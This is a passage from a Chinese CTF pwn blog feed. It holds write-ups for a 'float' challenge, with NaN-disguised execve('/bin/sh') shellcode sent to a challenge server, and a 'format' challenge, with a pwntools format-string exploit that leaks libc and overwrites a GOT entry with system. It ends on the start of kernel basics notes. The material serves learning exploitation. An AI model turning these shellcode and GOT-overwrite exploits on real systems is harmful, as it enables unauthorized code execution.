class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;deepin-terminal&quot;,&quot;-m&quot;,&quot;splitscreen&quot;,&quot;-e&quot;,&quot;bash&quot;,&quot;-c&quot;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = [<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">6666</span>]</span><br><span class="line">    p = remote(remote_addr[<span class="number">0</span>], remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line">sn  = <span class="keyword">lambda</span> x   : p.send(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>     : p.recvline()</span><br><span class="line">sl  = <span class="keyword">lambda</span> x   : p.sendline(x)</span><br><span class="line">rv  = <span class="keyword">lambda</span> x   : p.recv(x)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;1 1 0&#x27;</span>.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)*<span class="number">2</span> <span class="comment"># frist two doubles in the stack (padding)</span></span><br><span class="line"></span><br><span class="line">    jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">    NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line">    <span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line">    <span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line">    <span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line">    <span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line">    <span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line">    <span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line">    <span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line">    <span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line">    <span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line">    <span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line">    <span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line">    <span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">    payload += <span class="string">&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;expression:\n&#x27;</span>)</span><br><span class="line">    sn(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925684.png" alt="image-20240502202506903" style="zoom:50%;" /><h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+15h] [rbp-14Bh]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+16h] [rbp-14Ah]</span></span><br><span class="line">  <span class="type">char</span> *lineptr; <span class="comment">// [rsp+18h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+20h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  __int64 temp_size; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr1; <span class="comment">// [rsp+38h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+148h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):&quot;</span>);</span><br><span class="line">    lineptr = <span class="number">0LL</span>;</span><br><span class="line">    n = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>) &lt;= <span class="number">0</span> )    <span class="comment">// 读取到lineptr一行字符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = lineptr;</span><br><span class="line">    v3[<span class="built_in">strcspn</span>(lineptr, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*lineptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    temp_size = hexs2bin(lineptr, &amp;ptr);</span><br><span class="line">    ptr1 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( !temp_size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to decode hex&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n=~= miss-analyzer =~=&quot;</span>);</span><br><span class="line">    v5 = read_byte(&amp;ptr1, &amp;temp_size);          <span class="comment">// 读一个字节</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">4LL</span>);      <span class="comment">// 读4个字节</span></span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 读入format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hash: %s\n&quot;</span>, format);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 再次读入format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Player name: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 再次读入format</span></span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">10LL</span>);     <span class="comment">// 读10个字节</span></span><br><span class="line">    v6 = read_short(&amp;ptr1, &amp;temp_size);         <span class="comment">// 读2个字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Miss count: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Yep, looks like you missed.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You didn&#x27;t miss!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=~=~=~=~=~=~=~=~=~=~=\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(lineptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);     </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的静态分析十分困难，而且脚本的编写也很困难，算是长见识了。。（第一次脚本没写出来</p><p>先看read_string函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">read_string</span><span class="params">(_QWORD *a1, _QWORD *a2, _BYTE *a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> byte; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *a3 = <span class="number">0</span>;</span><br><span class="line">  result = (_BYTE *)read_byte(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result != <span class="number">0xB</span> )                 <span class="comment">// 第一个字节要是0b</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read string&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      byte = read_byte(a1, a2);</span><br><span class="line">      v10 |= (byte &amp; <span class="number">0x7F</span>) &lt;&lt; i;</span><br><span class="line">      <span class="keyword">if</span> ( byte &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = a4;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; v10 )</span><br><span class="line">        v6 = v10;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt;= j )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      a3[j] = read_byte(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 &gt; j )</span><br><span class="line">    &#123;</span><br><span class="line">      read_byte(a1, a2);</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( a4 &lt;= v10 )</span><br><span class="line">      v7 = a4;</span><br><span class="line">    result = &amp;a3[v7];</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看read_byte函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_byte</span><span class="params">(_QWORD *ptr1, _QWORD *ptr2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*ptr2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read replay&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *(_BYTE *)(*ptr1)++;</span><br><span class="line">  --*ptr2;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂的一匹，但是搞懂每个函数的内容，然后再一步一步来，便不会有太大的困难</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./format&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">content=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            gdb.attach(p,content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">            pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">return</span> process(elf_path)</span><br><span class="line">    <span class="keyword">return</span> remote()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_bytes</span>(<span class="params">nb:<span class="built_in">int</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;55&#x27;</span>*nb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    size = (<span class="built_in">hex</span>(<span class="built_in">len</span>(s))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = binascii.hexlify(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    info(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span> + <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;0b&quot;</span> + size + data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(payload) == <span class="built_in">bytes</span>:</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">    payload_ =consume_bytes(<span class="number">5</span>)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;11112222&quot;</span>)</span><br><span class="line">    payload_ +=read_string(payload)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;ohh good&quot;</span>)</span><br><span class="line">    payload_ +=consume_bytes(<span class="number">10</span>+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload_)</span><br><span class="line">    sla(<span class="string">b&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n&quot;</span>,payload_)</span><br><span class="line">    ru(<span class="string">b&quot;Player name: &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">leaklibc = input_1(<span class="string">&quot;%3$p&quot;</span>)</span><br><span class="line">info(<span class="string">f&#x27;leaklibc===&gt;<span class="subst">&#123;leaklibc&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(leaklibc,<span class="number">16</span>)-<span class="number">0x114887</span></span><br><span class="line">info(<span class="string">f&#x27;libc_base===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">auto = FmtStr(input_1,offset=<span class="number">14</span>)   <span class="comment">#input_1是往addr写入value的值，offset是偏移</span></span><br><span class="line"><span class="comment"># [*] Found format string offset: 14</span></span><br><span class="line"><span class="comment"># one = pack(libc.address + 0xebc81)    #这是某个one_gadget</span></span><br><span class="line">auto.write(elf.got[<span class="string">&#x27;strcspn&#x27;</span>],libc.sym.system)  <span class="comment">#先打包一个strcspn写入system的字节串</span></span><br><span class="line">auto.execute_writes()      <span class="comment">#然后再写入</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>总结 做格式化字符串漏洞的时候应该先把向addr写入value的自动函数写出来（不要怕麻烦，这样之后可以节省很多的麻烦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;h1 id=&quot;float&quot;&gt;&lt;a href=&quot;#float&quot; class=&quot;headerlink&quot; title=&quot;float&quot;&gt;</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel note</title>
    <link href="http://s1nec-1o.github.io/2024/04/28/kernel-note/"/>
    <id>http://s1nec-1o.github.io/2024/04/28/kernel-note/</id>
    <published>2024-04-28T11:15:48.000Z</published>
    <updated>2024-04-28T14:13:18.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kernel笔记"><a href="#kernel笔记" class="headerlink" title="kernel笔记"></a>kernel笔记</h1><p>首先是要配置环境，推荐[wiki](<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">Qemu 模拟环境 - CTF Wiki (ctf-wiki.org)</a>)和<a href="https://www.cjovi.icu/pwnreview/1318.html">这篇文章</a></p><p>其中调试部分我还搁置着准备等学有所成再来实战</p><p>可以将内核看作一个巨大的elf，它又有数据段</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>kernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p><p><img src="C:/Users/Lenovo/Pictures/Saved%20Pictures/Kernel_Layout.svg+xml"></p><p>kernel 最主要的功能有两点：</p><ol><li>控制并与硬件进行交互</li><li>提供 application 能运行的环境</li></ol><p>包括 I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p><h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device 